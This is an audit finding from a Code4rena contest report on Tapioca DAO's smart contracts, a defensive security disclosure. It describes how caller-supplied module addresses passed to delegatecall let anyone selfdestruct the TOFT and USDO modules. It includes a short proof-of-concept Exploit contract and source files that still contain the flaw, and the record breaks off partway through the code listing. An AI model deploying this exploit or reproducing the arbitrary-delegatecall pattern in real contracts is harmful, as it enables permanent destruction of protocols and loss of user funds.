{
  "Title": "[H-28] TOFT and USDO Modules Can Be Selfdestructed",
  "Content": "\n<https://github.com/Tapioca-DAO/tapiocaz-audit/blob/bcf61f79464cfdc0484aa272f9f6e28d5de36a8f/contracts/tOFT/modules/BaseTOFTLeverageModule.sol#L184-L193> \n\n<https://github.com/Tapioca-DAO/tapiocaz-audit/blob/bcf61f79464cfdc0484aa272f9f6e28d5de36a8f/contracts/tOFT/modules/BaseTOFTMarketModule.sol#L160-L168> \n\nhttps://github.com/Tapioca-DAO/tapiocaz-audit/blob/bcf61f79464cfdc0484aa272f9f6e28d5de36a8f/contracts/tOFT/modules/BaseTOFTOptionsModule.sol#L189-L200> \n\n<https://github.com/Tapioca-DAO/tapiocaz-audit/blob/bcf61f79464cfdc0484aa272f9f6e28d5de36a8f/contracts/tOFT/modules/BaseTOFTStrategyModule.sol#L152-L162> \n\n<https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/2286f80f928f41c8bc189d0657d74ba83286c668/contracts/usd0/modules/USDOLeverageModule.sol#L169-L1788> \n\n<https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/2286f80f928f41c8bc189d0657d74ba83286c668/contracts/usd0/modules/USDOMarketModule.sol#L168-L176> \n\n<https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/2286f80f928f41c8bc189d0657d74ba83286c668/contracts/usd0/modules/USDOOptionsModule.sol#L174-L185>\n\nAll TOFT and USDO modules have public functions that allow an attacker to supply an address `module` that is later used as a destination for a delegatecall. This can point to an attacker-controlled contract that is used to selfdestruct the module.\n\n```js\n    // USDOLeverageModule:leverageUp\n    function leverageUp(\n        address module,\n        uint16 _srcChainId,\n        bytes memory _srcAddress,\n        uint64 _nonce,\n        bytes memory _payload\n    ) public {\n        // .. snip ..\n        (bool success, bytes memory reason) = module.delegatecall( //@audit-issue arbitrary destination delegatecall\n            abi.encodeWithSelector(\n                this.leverageUpInternal.selector,\n                amount,\n                swapData,\n                externalData,\n                lzData,\n                leverageFor\n            )\n        );\n\n        if (!success) {\n            if (balanceAfter - balanceBefore >= amount) {\n                IERC20(address(this)).safeTransfer(leverageFor, amount);\n            }\n            revert(_getRevertMsg(reason)); //forward revert because it's handled by the main executor\n        }\n        // .. snip ..\n    }\n```\n\n### Impact\n\nBoth BaseTOFT and BaseUSDO initialize the module addresses to state variables in the constructor. Because there are no setter functions to adjust these variables post-deployment, the modules are permanently locked to the addresses specified in the constructor. If those addresses are selfdestructed, the modules are rendered unusable and all calls to these modules will revert. This cannot be repaired.\n\n[BaseUSDO.sol:constructor](https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/2286f80f928f41c8bc189d0657d74ba83286c668/contracts/usd0/BaseUSDO.sol#L67-L80)\n\n```js\n    // BaseUSDO.sol:constructor\n    constructor(\n        address _lzEndpoint,\n        IYieldBoxBase _yieldBox,\n        address _owner,\n        address payable _leverageModule,\n        address payable _marketModule,\n        address payable _optionsModule\n    ) BaseUSDOStorage(_lzEndpoint, _yieldBox) ERC20Permit(\"USDO\") {\n        leverageModule = USDOLeverageModule(_leverageModule);\n        marketModule = USDOMarketModule(_marketModule);\n        optionsModule = USDOOptionsModule(_optionsModule);\n\n\n        transferOwnership(_owner);\n    }\n```\n\n### Proof of Concept\n\nAttacker can deploy the `Exploit` contract below, and then call each of the vulnerable functions with the address of the `Exploit` contract as the `module` parameter. This will cause the module to selfdestruct, rendering it unusable.\n\n```js\npragma solidity ^0.8.18;\n\ncontract Exploit {\n    address payable constant attacker = payable(address(0xbadbabe));\n    fallback() external payable {\n        selfdestruct(attacker);\n    }\n}\n```\n\n### Recommended Mitigation Steps\n\nThe `module` parameter should be removed from the calldata in each of the vulnerable functions. Since the context of the call into these functions are designed to be delegatecalls and the storage layouts of the modules and the Base contracts are the same, the `module` address can be retreived from storage instead. This will prevent attackers from supplying arbitrary addresses as delegatecall destinations.\n\n**[0xRektora (Tapioca) confirmed via duplicate issue 146](https://github.com/code-423n4/2023-07-tapioca-findings/issues/146)**\n\n***\n\n",
  "Impact": "HIGH",
  "Source": "https://code4rena.com/reports/2023-07-tapioca",
  "Code": [
    {
      "filename": "contracts/tOFT/modules/BaseTOFTLeverageModule.sol",
      "content": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.18;\n\n//LZ\nimport \"tapioca-sdk/dist/contracts/libraries/LzLib.sol\";\n\n//TAPIOCA\nimport {IUSDOBase} from \"tapioca-periph/contracts/interfaces/IUSDO.sol\";\nimport \"tapioca-periph/contracts/interfaces/ISwapper.sol\";\nimport \"tapioca-periph/contracts/interfaces/IMagnetar.sol\";\nimport \"tapioca-periph/contracts/interfaces/ISingularity.sol\";\nimport \"tapioca-periph/contracts/interfaces/IPermitBorrow.sol\";\nimport \"tapioca-periph/contracts/interfaces/IPermitAll.sol\";\nimport \"tapioca-periph/contracts/interfaces/ITapiocaOptionsBroker.sol\";\nimport \"tapioca-periph/contracts/interfaces/ITapiocaOptionLiquidityProvision.sol\";\n\nimport \"../BaseTOFTStorage.sol\";\n\n/// @title tOFT leverage module\n/// @notice tOFT module for leverage type actions\ncontract BaseTOFTLeverageModule is BaseTOFTStorage {\n    using SafeERC20 for IERC20;\n    using BytesLib for bytes;\n\n    constructor(\n        address _lzEndpoint,\n        address _erc20,\n        IYieldBoxBase _yieldBox,\n        string memory _name,\n        string memory _symbol,\n        uint8 _decimal,\n        uint256 _hostChainID\n    )\n        BaseTOFTStorage(\n            _lzEndpoint,\n            _erc20,\n            _yieldBox,\n            _name,\n            _symbol,\n            _decimal,\n            _hostChainID\n        )\n    {}\n\n    function initMultiSell(\n        address from,\n        uint256 share,\n        IUSDOBase.ILeverageSwapData calldata swapData,\n        IUSDOBase.ILeverageLZData calldata lzData,\n        IUSDOBase.ILeverageExternalContractsData calldata externalData,\n        bytes calldata airdropAdapterParams,\n        ICommonData.IApproval[] calldata approvals\n    ) external payable {\n        bytes32 senderBytes = LzLib.addressToBytes32(from);\n\n        bytes memory lzPayload = abi.encode(\n            PT_MARKET_MULTIHOP_SELL,\n            senderBytes,\n            from,\n            share,\n            swapData,\n            lzData,\n            externalData,\n            airdropAdapterParams,\n            approvals\n        );\n\n        _lzSend(\n            lzData.lzSrcChainId,\n            lzPayload,\n            payable(lzData.refundAddress),\n            lzData.zroPaymentAddress,\n            airdropAdapterParams,\n            msg.value\n        );\n        emit SendToChain(lzData.lzSrcChainId, msg.sender, senderBytes, 0);\n    }\n\n    function sendForLeverage(\n        uint256 amount,\n        address leverageFor,\n        IUSDOBase.ILeverageLZData calldata lzData,\n        IUSDOBase.ILeverageSwapData calldata swapData,\n        IUSDOBase.ILeverageExternalContractsData calldata externalData\n    ) external payable {\n        bytes32 senderBytes = LzLib.addressToBytes32(msg.sender);\n        _debitFrom(msg.sender, lzEndpoint.getChainId(), senderBytes, amount);\n\n        bytes memory lzPayload = abi.encode(\n            PT_LEVERAGE_MARKET_DOWN,\n            senderBytes,\n            amount,\n            swapData,\n            externalData,\n            lzData,\n            leverageFor\n        );\n\n        _lzSend(\n            lzData.lzDstChainId,\n            lzPayload,\n            payable(lzData.refundAddress),\n            lzData.zroPaymentAddress,\n            lzData.dstAirdropAdapterParam,\n            msg.value\n        );\n        emit SendToChain(lzData.lzDstChainId, msg.sender, senderBytes, amount);\n    }\n\n    //---Destination calls---\n    function multiHop(bytes memory _payload) public {\n        (\n            ,\n            ,\n            address from,\n            uint256 share,\n            IUSDOBase.ILeverageSwapData memory swapData,\n            IUSDOBase.ILeverageLZData memory lzData,\n            IUSDOBase.ILeverageExternalContractsData memory externalData,\n            ICommonData.IApproval[] memory approvals\n        ) = abi.decode(\n                _payload,\n                (\n                    uint16,\n                    bytes32,\n                    address,\n                    uint256,\n                    IUSDOBase.ILeverageSwapData,\n                    IUSDOBase.ILeverageLZData,\n                    IUSDOBase.ILeverageExternalContractsData,\n                    ICommonData.IApproval[]\n                )\n            );\n\n        if (approvals.length > 0) {\n            _callApproval(approvals);\n        }\n\n        ISingularity(externalData.srcMarket).multiHopSellCollateral(\n            from,\n            share,\n            swapData,\n            lzData,\n            externalData\n        );\n    }\n\n    function leverageDown(\n        address module,\n        uint16 _srcChainId,\n        bytes memory _srcAddress,\n        uint64 _nonce,\n        bytes memory _payload\n    ) public {\n        (\n            ,\n            ,\n            uint256 amount,\n            IUSDOBase.ILeverageSwapData memory swapData,\n            IUSDOBase.ILeverageExternalContractsData memory externalData,\n            IUSDOBase.ILeverageLZData memory lzData,\n            address leverageFor\n        ) = abi.decode(\n                _payload,\n                (\n                    uint16,\n                    bytes32,\n                    uint256,\n                    IUSDOBase.ILeverageSwapData,\n                    IUSDOBase.ILeverageExternalContractsData,\n                    IUSDOBase.ILeverageLZData,\n                    address\n                )\n            );\n\n        uint256 balanceBefore = balanceOf(address(this));\n        bool credited = creditedPackets[_srcChainId][_srcAddress][_nonce];\n        if (!credited) {\n            _creditTo(_srcChainId, address(this), amount);\n            creditedPackets[_srcChainId][_srcAddress][_nonce] = true;\n        }\n        uint256 balanceAfter = balanceOf(address(this));\n\n        (bool success, bytes memory reason) = module.delegatecall(\n            abi.encodeWithSelector(\n                this.leverageDownInternal.selector,\n                amount,\n                swapData,\n                externalData,\n                lzData,\n                leverageFor\n            )\n        );\n\n        if (!success) {\n            if (balanceAfter - balanceBefore >= amount) {\n                IERC20(address(this)).safeTransfer(leverageFor, amount);\n            }\n            revert(_getRevertMsg(reason)); //forward revert because it's handled by the main executor\n        }\n\n        emit ReceiveFromChain(_srcChainId, leverageFor, amount);\n    }\n\n    function leverageDownInternal(\n        uint256 amount,\n        IUSDOBase.ILeverageSwapData memory swapData,\n        IUSDOBase.ILeverageExternalContractsData memory externalData,\n        IUSDOBase.ILeverageLZData memory lzData,\n        address leverageFor\n    ) public payable {\n        _unwrap(address(this), amount);\n\n        //swap to USDO\n        IERC20(erc20).approve(externalData.swapper, amount);\n        ISwapper.SwapData memory _swapperData = ISwapper(externalData.swapper)\n            .buildSwapData(erc20, swapData.tokenOut, amount, 0, false, false);\n        (uint256 amountOut, ) = ISwapper(externalData.swapper).swap(\n            _swapperData,\n            swapData.amountOutMin,\n            address(this),\n            swapData.data\n        );\n\n        //repay\n        uint256 repayableAmount = IMagnetar(externalData.magnetar)\n            .getBorrowPartForAmount(externalData.srcMarket, amountOut);\n        ICommonData.IApproval[] memory approvals;\n        IUSDOBase(swapData.tokenOut).sendAndLendOrRepay{\n            value: address(this).balance\n        }(\n            address(this),\n            leverageFor,\n            lzData.lzSrcChainId,\n            lzData.zroPaymentAddress,\n            IUSDOBase.ILendOrRepayParams({\n                repay: true,\n                depositAmount: amountOut,\n                repayAmount: repayableAmount,\n                marketHelper: externalData.magnetar,\n                market: externalData.srcMarket,\n                removeCollateral: false,\n                removeCollateralShare: 0,\n                lockData: ITapiocaOptionLiquidityProvision.IOptionsLockData({\n                    lock: false,\n                    target: address(0),\n                    lockDuration: 0,\n                    amount: 0,\n                    fraction: 0\n                }),\n                participateData: ITapiocaOptionsBroker.IOptionsParticipateData({\n                    participate: false,\n                    target: address(0),\n                    tOLPTokenId: 0\n                })\n            }),\n            approvals,\n            ICommonData.IWithdrawParams({\n                withdraw: false,\n                withdrawLzFeeAmount: 0,\n                withdrawOnOtherChain: false,\n                withdrawLzChainId: 0,\n                withdrawAdapterParams: \"0x\"\n            }),\n            LzLib.buildDefaultAdapterParams(lzData.srcExtraGasLimit)\n        );\n    }\n\n    function _unwrap(address _toAddress, uint256 _amount) private {\n        _burn(msg.sender, _amount);\n\n        if (erc20 == address(0)) {\n            _safeTransferETH(_toAddress, _amount);\n        } else {\n            IERC20(erc20).safeTransfer(_toAddress, _amount);\n        }\n    }\n\n    function _safeTransferETH(address to, uint256 amount) private {\n        (bool sent, ) = to.call{value: amount}(\"\");\n        require(sent, \"TOFT_failed\");\n    }\n\n    function _callApproval(ICommonData.IApproval[] memory approvals) private {\n        for (uint256 i = 0; i < approvals.length; ) {\n            if (approvals[i].permitBorrow) {\n                try\n                    IPermitBorrow(approvals[i].target).permitBorrow(\n                        approvals[i].owner,\n                        approvals[i].spender,\n                        approvals[i].value,\n                        approvals[i].deadline,\n                        approvals[i].v,\n                        approvals[i].r,\n                        approvals[i].s\n                    )\n                {} catch Error(string memory reason) {\n                    if (!approvals[i].allowFailure) {\n                        revert(reason);\n                    }\n                }\n            } else if (approvals[i].permitAll) {\n                try\n                    IPermitAll(approvals[i].target).permitAll(\n                        approvals[i].owner,\n                        approvals[i].spender,\n                        approvals[i].deadline,\n                        approvals[i].v,\n                        approvals[i].r,\n                        approvals[i].s\n                    )\n                {} catch Error(string memory reason) {\n                    if (!approvals[i].allowFailure) {\n                        revert(reason);\n                    }\n                }\n            } else {\n                try\n                    IERC20Permit(approvals[i].target).permit(\n                        approvals[i].owner,\n                        approvals[i].spender,\n                        approvals[i].value,\n                        approvals[i].deadline,\n                        approvals[i].v,\n                        approvals[i].r,\n                        approvals[i].s\n                    )\n                {} catch Error(string memory reason) {\n                    if (!approvals[i].allowFailure) {\n                        revert(reason);\n                    }\n                }\n            }\n\n            unchecked {\n                ++i;\n            }\n        }\n    }\n}"
    },
    {
      "filename": "contracts/tOFT/modules/BaseTOFTMarketModule.sol",
      "content": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.18;\n\n//LZ\nimport \"tapioca-sdk/dist/contracts/libraries/LzLib.sol\";\n\n//TAPIOCA\nimport {IUSDOBase} from \"tapioca-periph/contracts/interfaces/IUSDO.sol\";\nimport \"tapioca-periph/contracts/interfaces/ISwapper.sol\";\nimport \"tapioca-periph/contracts/interfaces/ITapiocaOFT.sol\";\nimport \"tapioca-periph/contracts/interfaces/IMagnetar.sol\";\nimport \"tapioca-periph/contracts/interfaces/IMarket.sol\";\nimport \"tapioca-periph/contracts/interfaces/IPermitBorrow.sol\";\nimport \"tapioca-periph/contracts/interfaces/IPermitAll.sol\";\n\nimport \"../BaseTOFTStorage.sol\";\n\n/// @title tOFT market module\n/// @notice tOFT module for market type actions\ncontract BaseTOFTMarketModule is BaseTOFTStorage {\n    using SafeERC20 for IERC20;\n    using BytesLib for bytes;\n\n    constructor(\n        address _lzEndpoint,\n        address _erc20,\n        IYieldBoxBase _yieldBox,\n        string memory _name,\n        string memory _symbol,\n        uint8 _decimal,\n        uint256 _hostChainID\n    )\n        BaseTOFTStorage(\n            _lzEndpoint,\n            _erc20,\n            _yieldBox,\n            _name,\n            _symbol,\n            _decimal,\n            _hostChainID\n        )\n    {}\n\n    function removeCollateral(\n        address from,\n        address to,\n        uint16 lzDstChainId,\n        address zroPaymentAddress,\n        ICommonData.IWithdrawParams calldata withdrawParams,\n        ITapiocaOFT.IRemoveParams calldata removeParams,\n        ICommonData.IApproval[] calldata approvals,\n        bytes calldata adapterParams\n    ) external payable {\n        bytes32 toAddress = LzLib.addressToBytes32(to);\n\n        bytes memory lzPayload = abi.encode(\n            PT_MARKET_REMOVE_COLLATERAL,\n            from,\n            to,\n            toAddress,\n            removeParams,\n            withdrawParams,\n            approvals\n        );\n\n        _lzSend(\n            lzDstChainId,\n            lzPayload,\n            payable(from),\n            zroPaymentAddress,\n            adapterParams,\n            msg.value\n        );\n\n        emit SendToChain(lzDstChainId, from, toAddress, 0);\n    }\n\n    /// @notice sends TOFT to a specific chain and performs a borrow operation\n    /// @param _from the sender address\n    /// @param _to the receiver address\n    /// @param lzDstChainId the destination LayerZero id\n    /// @param airdropAdapterParams the LayerZero aidrop adapter params\n    /// @param borrowParams the borrow operation data\n    /// @param withdrawParams the withdraw operation data\n    /// @param options the cross chain send operation data\n    /// @param approvals the cross chain approval operation data\n    function sendToYBAndBorrow(\n        address _from,\n        address _to,\n        uint16 lzDstChainId,\n        bytes calldata airdropAdapterParams,\n        ITapiocaOFT.IBorrowParams calldata borrowParams,\n        ICommonData.IWithdrawParams calldata withdrawParams,\n        ICommonData.ISendOptions calldata options,\n        ICommonData.IApproval[] calldata approvals\n    ) external payable {\n        bytes32 toAddress = LzLib.addressToBytes32(_to);\n        _debitFrom(\n            _from,\n            lzEndpoint.getChainId(),\n            toAddress,\n            borrowParams.amount\n        );\n\n        bytes memory lzPayload = abi.encode(\n            PT_YB_SEND_SGL_BORROW,\n            _from,\n            toAddress,\n            borrowParams,\n            withdrawParams,\n            approvals\n        );\n\n        _lzSend(\n            lzDstChainId,\n            lzPayload,\n            payable(_from),\n            options.zroPaymentAddress,\n            airdropAdapterParams,\n            msg.value\n        );\n\n        emit SendToChain(lzDstChainId, _from, toAddress, borrowParams.amount);\n    }\n\n    function borrow(\n        address module,\n        uint16 _srcChainId,\n        bytes memory _srcAddress,\n        uint64 _nonce,\n        bytes memory _payload\n    ) public payable {\n        (\n            ,\n            address _from, //from\n            bytes32 _to,\n            ITapiocaOFT.IBorrowParams memory borrowParams,\n            ICommonData.IWithdrawParams memory withdrawParams,\n            ICommonData.IApproval[] memory approvals\n        ) = abi.decode(\n                _payload,\n                (\n                    uint16,\n                    address,\n                    bytes32,\n                    ITapiocaOFT.IBorrowParams,\n                    ICommonData.IWithdrawParams,\n                    ICommonData.IApproval[]\n                )\n            );\n\n        uint256 balanceBefore = balanceOf(address(this));\n        bool credited = creditedPackets[_srcChainId][_srcAddress][_nonce];\n        if (!credited) {\n            _creditTo(_srcChainId, address(this), borrowParams.amount);\n            creditedPackets[_srcChainId][_srcAddress][_nonce] = true;\n        }\n        uint256 balanceAfter = balanceOf(address(this));\n\n        (bool success, bytes memory reason) = module.delegatecall(\n            abi.encodeWithSelector(\n                this.borrowInternal.selector,\n                _to,\n                borrowParams,\n                withdrawParams,\n                approvals\n            )\n        );\n\n        if (!success) {\n            if (balanceAfter - balanceBefore >= borrowParams.amount) {\n                IERC20(address(this)).safeTransfer(_from, borrowParams.amount);\n            }\n            revert(_getRevertMsg(reason)); //forward revert because it's handled by the main executor\n        }\n\n        emit ReceiveFromChain(_srcChainId, _from, borrowParams.amount);\n    }\n\n    function borrowInternal(\n        bytes32 _to,\n        ITapiocaOFT.IBorrowParams memory borrowParams,\n        ICommonData.IWithdrawParams memory withdrawParams,\n        ICommonData.IApproval[] memory approvals\n    ) public payable {\n        if (approvals.length > 0) {\n            _callApproval(approvals);\n        }\n\n        // Use market helper to deposit, add collateral to market and withdrawTo\n        approve(address(borrowParams.marketHelper), borrowParams.amount);\n        IMagnetar(borrowParams.marketHelper)\n            .depositAddCollateralAndBorrowFromMarket{value: msg.value}(\n            borrowParams.market,\n            LzLib.bytes32ToAddress(_to),\n            borrowParams.amount,\n            borrowParams.borrowAmount,\n            true,\n            true,\n            withdrawParams\n        );\n    }\n\n    function remove(bytes memory _payload) public {\n        (\n            ,\n            ,\n            address to,\n            ,\n            ITapiocaOFT.IRemoveParams memory removeParams,\n            ICommonData.IWithdrawParams memory withdrawParams,\n            ICommonData.IApproval[] memory approvals\n        ) = abi.decode(\n                _payload,\n                (\n                    uint16,\n                    address,\n                    address,\n                    bytes32,\n                    ITapiocaOFT.IRemoveParams,\n                    ICommonData.IWithdrawParams,\n                    ICommonData.IApproval[]\n                )\n            );\n\n        if (approvals.length > 0) {\n            _callApproval(approvals);\n        }\n\n        approve(removeParams.market, removeParams.share);\n        IMarket(removeParams.market).removeCollateral(\n            to,\n            to,\n            removeParams.share\n        );\n        if (withdrawParams.withdraw) {\n            address ybAddress = IMarket(removeParams.market).yieldBox();\n            uint256 assetId = IMarket(removeParams.market).collateralId();\n            IMagnetar(removeParams.marketHelper).withdrawToChain{\n                value: withdrawParams.withdrawLzFeeAmount\n            }(\n                ybAddress,\n                to,\n                assetId,\n                withdrawParams.withdrawLzChainId,\n                LzLib.addressToBytes32(to),\n                IYieldBoxBase(ybAddress).toAmount(\n                    assetId,\n                    removeParams.share,\n                    false\n                ),\n                removeParams.share,\n                withdrawParams.withdrawAdapterParams,\n                payable(to),\n                withdrawParams.withdrawLzFeeAmount\n            );\n        }\n    }\n\n    function _callApproval(ICommonData.IApproval[] memory approvals) private {\n        for (uint256 i = 0; i < approvals.length; ) {\n            if (approvals[i].permitBorrow) {\n                try\n                    IPermitBorrow(approvals[i].target).permitBorrow(\n                        approvals[i].owner,\n                        approvals[i].spender,\n                        approvals[i].value,\n                        approvals[i].deadline,\n                        approvals[i].v,\n                        approvals[i].r,\n                        approvals[i].s\n                    )\n                {} catch Error(string memory reason) {\n                    if (!approvals[i].allowFailure) {\n                        revert(reason);\n                    }\n                }\n            } else if (approvals[i].permitAll) {\n                try\n                    IPermitAll(approvals[i].target).permitAll(\n                        approvals[i].owner,\n                        approvals[i].spender,\n                        approvals[i].deadline,\n                        approvals[i].v,\n                        approvals[i].r,\n                        approvals[i].s\n                    )\n                {} catch Error(string memory reason) {\n                    if (!approvals[i].allowFailure) {\n                        revert(reason);\n                    }\n                }\n            } else {\n                try\n                    IERC20Permit(approvals[i].target).permit(\n                        approvals[i].owner,\n                        approvals[i].spender,\n                        approvals[i].value,\n                        approvals[i].deadline,\n                        approvals[i].v,\n                        approvals[i].r,\n                        approvals[i].s\n                    )\n                {} catch Error(string memory reason) {\n                    if (!approvals[i].allowFailure) {\n                        revert(reason);\n                    }\n                }\n            }\n\n            unchecked {\n                ++i;\n            }\n        }\n    }\n}"
    },
    {
      "filename": "contracts/tOFT/modules/BaseTOFTOptionsModule.sol",
      "content": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.18;\n\n//LZ\nimport \"tapioca-sdk/dist/contracts/libraries/LzLib.sol\";\n\n//TAPIOCA\nimport \"tapioca-periph/contracts/interfaces/IPermitBorrow.sol\";\nimport \"tapioca-periph/contracts/interfaces/IPermitAll.sol\";\nimport \"tapioca-periph/contracts/interfaces/ITapiocaOptionsBroker.sol\";\n// import {ITapiocaOptionsBrokerCrossChain} from \"tapioca-periph/contracts/interfaces/ITapiocaOptionsBroker.sol\";\nimport \"../BaseTOFTStorage.sol\";\n\n/// @title tOFT options module\n/// @notice tOFT module for oTAP type actions\ncontract BaseTOFTOptionsModule is BaseTOFTStorage {\n    using SafeERC20 for IERC20;\n\n    constructor(\n        address _lzEndpoint,\n        address _erc20,\n        IYieldBoxBase _yieldBox,\n        string memory _name,\n        string memory _symbol,\n        uint8 _decimal,\n        uint256 _hostChainID\n    )\n        BaseTOFTStorage(\n            _lzEndpoint,\n            _erc20,\n            _yieldBox,\n            _name,\n            _symbol,\n            _decimal,\n            _hostChainID\n        )\n    {}\n\n    function triggerSendFrom(\n        uint16 lzDstChainId,\n        bytes calldata airdropAdapterParams,\n        address zroPaymentAddress,\n        uint256 amount,\n        ISendFrom.LzCallParams calldata sendFromData,\n        ICommonData.IApproval[] calldata approvals\n    ) external payable {\n        bytes memory lzPayload = abi.encode(\n            PT_SEND_FROM,\n            msg.sender,\n            amount,\n            sendFromData,\n            lzEndpoint.getChainId(),\n            approvals\n        );\n\n        _lzSend(\n            lzDstChainId,\n            lzPayload,\n            payable(msg.sender),\n            zroPaymentAddress,\n            airdropAdapterParams,\n            msg.value\n        );\n\n        emit SendToChain(\n            lzDstChainId,\n            msg.sender,\n            LzLib.addressToBytes32(msg.sender),\n            0\n        );\n    }\n\n    function exerciseOption(\n        ITapiocaOptionsBrokerCrossChain.IExerciseOptionsData\n            calldata optionsData,\n        ITapiocaOptionsBrokerCrossChain.IExerciseLZData calldata lzData,\n        ITapiocaOptionsBrokerCrossChain.IExerciseLZSendTapData\n            calldata tapSendData,\n        ICommonData.IApproval[] calldata approvals\n    ) external payable {\n        bytes32 toAddress = LzLib.addressToBytes32(optionsData.from);\n\n        _debitFrom(\n            optionsData.from,\n            lzEndpoint.getChainId(),\n            toAddress,\n            optionsData.paymentTokenAmount\n        );\n\n        bytes memory lzPayload = abi.encode(\n            PT_TAP_EXERCISE,\n            optionsData,\n            tapSendData,\n            approvals\n        );\n\n        bytes memory adapterParams = LzLib.buildDefaultAdapterParams(\n            lzData.extraGas\n        );\n\n        _lzSend(\n            lzData.lzDstChainId,\n            lzPayload,\n            payable(optionsData.from),\n            lzData.zroPaymentAddress,\n            adapterParams,\n            msg.value\n        );\n\n        emit SendToChain(\n            lzData.lzDstChainId,\n            optionsData.from,\n            toAddress,\n            optionsData.paymentTokenAmount\n        );\n    }\n\n    function sendFromDestination(bytes memory _payload) public {\n        (\n            ,\n            address from,\n            uint256 amount,\n            ISendFrom.LzCallParams memory callParams,\n            uint16 lzDstChainId,\n            ICommonData.IApproval[] memory approvals\n        ) = abi.decode(\n                _payload,\n                (\n                    uint16,\n                    address,\n                    uint256,\n                    ISendFrom.LzCallParams,\n                    uint16,\n                    ICommonData.IApproval[]\n                )\n            );\n\n        if (approvals.length > 0) {\n            _callApproval(approvals);\n        }\n\n        ISendFrom(address(this)).sendFrom{value: address(this).balance}(\n            from,\n            lzDstChainId,\n            LzLib.addressToBytes32(from),\n            amount,\n            callParams\n        );\n\n        emit ReceiveFromChain(lzDstChainId, from, 0);\n    }\n\n    function exercise(\n        address module,\n        uint16 _srcChainId,\n        bytes memory _srcAddress,\n        uint64 _nonce,\n        bytes memory _payload\n    ) public {\n        (\n            ,\n            ITapiocaOptionsBrokerCrossChain.IExerciseOptionsData\n                memory optionsData,\n            ITapiocaOptionsBrokerCrossChain.IExerciseLZSendTapData\n                memory tapSendData,\n            ICommonData.IApproval[] memory approvals\n        ) = abi.decode(\n                _payload,\n                (\n                    uint16,\n                    ITapiocaOptionsBrokerCrossChain.IExerciseOptionsData,\n                    ITapiocaOptionsBrokerCrossChain.IExerciseLZSendTapData,\n                    ICommonData.IApproval[]\n                )\n            );\n\n        uint256 balanceBefore = balanceOf(address(this));\n        bool credited = creditedPackets[_srcChainId][_srcAddress][_nonce];\n        if (!credited) {\n            _creditTo(\n                _srcChainId,\n                address(this),\n                optionsData.paymentTokenAmount\n            );\n            creditedPackets[_srcChainId][_srcAddress][_nonce] = true;\n        }\n        uint256 balanceAfter = balanceOf(address(this));\n\n        (bool success, bytes memory reason) = module.delegatecall(\n            abi.encodeWithSelector(\n                this.exerciseInternal.selector,\n                optionsData.from,\n                optionsData.oTAPTokenID,\n                optionsData.paymentToken,\n                optionsData.tapAmount,\n                optionsData.target,\n                tapSendData,\n                approvals\n            )\n        );\n\n        if (!success) {\n            if (\n                balanceAfter - balanceBefore >= optionsData.paymentTokenAmount\n            ) {\n                IERC20(address(this)).safeTransfer(\n                    optionsData.from,\n                    optionsData.paymentTokenAmount\n                );\n            }\n            revert(_getRevertMsg(reason)); //forward revert because it's handled by the main executor\n        }\n\n        emit ReceiveFromChain(\n            _srcChainId,\n            optionsData.from,\n            optionsData.paymentTokenAmount\n        );\n    }\n\n    function exerciseInternal(\n        address from,\n        uint256 oTAPTokenID,\n        address paymentToken,\n        uint256 tapAmount,\n        address target,\n        ITapiocaOptionsBrokerCrossChain.IExerciseLZSendTapData\n            memory tapSendData,\n        ICommonData.IApproval[] memory approvals\n    ) public {\n        if (approvals.length > 0) {\n            _callApproval(approvals);\n        }\n\n        ITapiocaOptionsBroker(target).exerciseOption(\n            oTAPTokenID,\n            paymentToken,\n            tapAmount\n        );\n        if (tapSendData.withdrawOnAnotherChain) {\n            ISendFrom(tapSendData.tapOftAddress).sendFrom(\n                address(this),\n                tapSendData.lzDstChainId,\n                LzLib.addressToBytes32(from),\n                tapAmount,\n                ISendFrom.LzCallParams({\n                    refundAddress: payable(from),\n                    zroPaymentAddress: tapSendData.zroPaymentAddress,\n                    adapterParams: LzLib.buildDefaultAdapterParams(\n                        tapSendData.extraGas\n                    )\n                })\n            );\n        } else {\n            IERC20(tapSendData.tapOftAddress).safeTransfer(from, tapAmount);\n        }\n    }\n\n    function _callApproval(ICommonData.IApproval[] memory approvals) private {\n        for (uint256 i = 0; i < approvals.length; ) {\n            if (approvals[i].permitBorrow) {\n                try\n                    IPermitBorrow(approvals[i].target).permitBorrow(\n                        approvals[i].owner,\n                        approvals[i].spender,\n                        approvals[i].value,\n                        approvals[i].deadline,\n                        approvals[i].v,\n                        approvals[i].r,\n                        approvals[i].s\n                    )\n                {} catch Error(string memory reason) {\n                    if (!approvals[i].allowFailure) {\n                        revert(reason);\n                    }\n                }\n            } else if (approvals[i].permitAll) {\n                try\n                    IPermitAll(approvals[i].target).permitAll(\n                        approvals[i].owner,\n                        approvals[i].spender,\n                        approvals[i].deadline,\n                        approvals[i].v,\n                        approvals[i].r,\n                        approvals[i].s\n                    )\n                {} catch Error(string memory reason) {\n                    if (!approvals[i].allowFailure) {\n                        revert(reason);\n                    }\n                }\n            } else {\n                try\n                    IERC20Permit(approvals[i].target).permit(\n                        approvals[i].owner,\n                        approvals[i].spender,\n                        approvals[i].value,\n                        approvals[i].deadline,\n                        approvals[i].v,\n                        approvals[i].r,\n                        approvals[i].s\n                    )\n                {} catch Error(string memory reason) {\n                    if (!approvals[i].allowFailure) {\n                        revert(reason);\n                    }\n                }\n            }\n\n            unchecked {\n                ++i;\n            }\n        }\n    }\n}"
    },
    {
      "filename": "contracts/tOFT/modules/BaseTOFTStrategyModule.sol",
